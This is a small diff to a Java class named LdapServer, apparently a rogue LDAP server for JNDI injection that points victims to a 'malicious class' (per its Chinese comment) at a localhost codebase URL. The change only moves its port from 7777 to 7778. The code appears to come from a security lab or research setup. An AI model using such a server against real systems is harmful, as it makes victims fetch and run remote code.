@@ -25,7 +25,7 @@ public class LdapServer {
     public static void main ( String[] tmp_args ) {
         // 恶意类的地址
         String[] args=new String[]{"http://127.0.0.1:8000/#ExecTest"};
-        int port = 7777;
+        int port = 7778;
 
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
